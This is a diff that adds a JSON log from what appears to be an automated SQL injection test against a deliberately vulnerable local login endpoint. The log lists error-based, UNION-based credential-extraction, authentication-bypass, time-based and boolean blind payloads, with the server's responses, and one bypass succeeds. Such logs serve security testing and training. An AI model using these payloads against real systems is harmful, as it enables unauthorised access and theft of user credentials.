@@ -1,0 +1,446 @@
+{
+  "metadata": {
+    "start_time": "2026-05-12T07:59:58.317236",
+    "target": "http://localhost:5001",
+    "phases_run": [],
+    "end_time": "2026-05-12T08:00:12.189179"
+  },
+  "phases": {
+    "phase_1": [
+      {
+        "test_name": "Basic Error Detection",
+        "payload": "admin'",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.027802,
+        "response_length": 257,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin'' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "AND 1=1 Condition",
+        "payload": "admin' AND 1=1 --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.010909,
+        "response_length": 268,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND 1=1 --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "AND 1=2 Condition",
+        "payload": "admin' AND 1=2 --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.021938,
+        "response_length": 268,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND 1=2 --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Database Version",
+        "payload": "' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.006816,
+        "response_length": 319,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Database Name",
+        "payload": "' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.022649,
+        "response_length": 320,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Current User",
+        "payload": "' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005073,
+        "response_length": 316,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --' AND password='test123'"
+        }
+      }
+    ],
+    "phase_2": [
+      {
+        "test_name": "Admin Comment Bypass",
+        "payload": "admin' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005754,
+        "response_length": 262,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' --' AND password='anything'"
+        }
+      },
+      {
+        "test_name": "Always True OR",
+        "payload": "' OR '1'='1' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.018445,
+        "response_length": 268,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' OR '1'='1' --' AND password='anything'"
+        }
+      },
+      {
+        "test_name": "Admin OR True",
+        "payload": "admin' OR '1'='1' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.007229,
+        "response_length": 273,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' OR '1'='1' --' AND password='anything'"
+        }
+      },
+      {
+        "test_name": "Numeric OR True",
+        "payload": "' OR 1=1 --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.007167,
+        "response_length": 264,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' OR 1=1 --' AND password='anything'"
+        }
+      },
+      {
+        "test_name": "Block Comment",
+        "payload": "admin'/*",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.01259,
+        "response_length": 279,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/*' AND password='anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin'/*' AND password='anything'"
+        }
+      },
+      {
+        "test_name": "Hash Comment",
+        "payload": "admin' #",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 200,
+        "success": true,
+        "response_time": 0.015804,
+        "response_length": 169,
+        "response_data": {
+          "success": true,
+          "user": {
+            "id": 2,
+            "username": "admin",
+            "email": "ikodmq@glmq.com",
+            "role": "user"
+          },
+          "sql": "SELECT * FROM Users WHERE username='admin' #' AND password='anything'"
+        }
+      }
+    ],
+    "phase_3": [
+      {
+        "test_name": "UNION Column Test 1",
+        "payload": "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.017707,
+        "response_length": 279,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT 1,2,3,4,5,6,7,8,9 --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Extract All Users",
+        "payload": "' UNION SELECT id, username, email, password, role, lastLogin, isActive, createdAt, updatedAt FROM Users --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.020734,
+        "response_length": 376,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password='test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT id, username, email, password, role, lastLogin, isActive, createdAt, updatedAt FROM Users --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Extract Admin Password",
+        "payload": "' UNION SELECT id, username, email, password, role, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.007725,
+        "response_length": 358,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT id, username, email, password, role, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "List Tables",
+        "payload": "' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.006314,
+        "response_length": 390,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "List Users Columns",
+        "payload": "' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'Users' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005655,
+        "response_length": 387,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'Users' --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Extract Articles",
+        "payload": "' UNION SELECT id, title, content, category, authorId, createdAt, updatedAt, NULL, NULL FROM Articles --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005677,
+        "response_length": 373,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password='test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT id, title, content, category, authorId, createdAt, updatedAt, NULL, NULL FROM Articles --' AND password='test123'"
+        }
+      }
+    ],
+    "phase_4": [
+      {
+        "test_name": "Time-Based True",
+        "payload": "admin' AND IF(1=1, SLEEP(2), 0) --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005573,
+        "response_length": 287,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND IF(1=1, SLEEP(2), 0) --' AND password='anything'"
+        },
+        "actual_delay": 0.006654024124145508
+      },
+      {
+        "test_name": "Time-Based False",
+        "payload": "admin' AND IF(1=2, SLEEP(2), 0) --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.004754,
+        "response_length": 287,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND IF(1=2, SLEEP(2), 0) --' AND password='anything'"
+        },
+        "actual_delay": 0.005327701568603516
+      },
+      {
+        "test_name": "Boolean True",
+        "payload": "admin' AND '1'='1' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.020156,
+        "response_length": 274,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND '1'='1' --' AND password='anything'"
+        },
+        "actual_delay": 0.02097487449645996
+      },
+      {
+        "test_name": "Boolean False",
+        "payload": "admin' AND '1'='2' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005062,
+        "response_length": 274,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'anything'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin' AND '1'='2' --' AND password='anything'"
+        },
+        "actual_delay": 0.006073713302612305
+      }
+    ],
+    "phase_5": [
+      {
+        "test_name": "CONCAT All Users",
+        "payload": "' UNION SELECT CONCAT(username, ':', email, ':', password, ':', role), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005973,
+        "response_length": 400,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password='test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT CONCAT(username, ':', email, ':', password, ':', role), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "GROUP_CONCAT All",
+        "payload": "' UNION SELECT GROUP_CONCAT(CONCAT(username, '|', email, '|', password) SEPARATOR '; '), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.018628,
+        "response_length": 418,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password='test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='' UNION SELECT GROUP_CONCAT(CONCAT(username, '|', email, '|', password) SEPARATOR '; '), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --' AND password='test123'"
+        }
+      }
+    ],
+    "phase_6": [],
+    "phase_7": [
+      {
+        "test_name": "Register with Malicious Username",
+        "payload": "test' OR '1'='1",
+        "status_code": 404,
+        "success": false,
+        "endpoint": "/api/vulnerable/register",
+        "response_text": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot POST /api/vulnerable/register</pre>\n</body>\n</html>\n"
+      }
+    ],
+    "phase_9": [
+      {
+        "test_name": "URL Encoding",
+        "payload": "%27%20OR%20%271%27%3D%271",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 401,
+        "success": false,
+        "response_time": 0.007879,
+        "response_length": 47,
+        "response_data": {
+          "success": false,
+          "error": "Invalid credentials"
+        }
+      },
+      {
+        "test_name": "Case Variation",
+        "payload": "AdMiN' --",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.005333,
+        "response_length": 260,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='AdMiN' --' AND password='test123'"
+        }
+      },
+      {
+        "test_name": "Double Comment",
+        "payload": "admin'/**/--",
+        "endpoint": "/api/vulnerable/login",
+        "field": "username",
+        "status_code": 500,
+        "success": false,
+        "response_time": 0.015885,
+        "response_length": 263,
+        "response_data": {
+          "success": false,
+          "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test123'' at line 1",
+          "sql": "SELECT * FROM Users WHERE username='admin'/**/--' AND password='test123'"
+        }
+      }
+    ]
+  }
+}
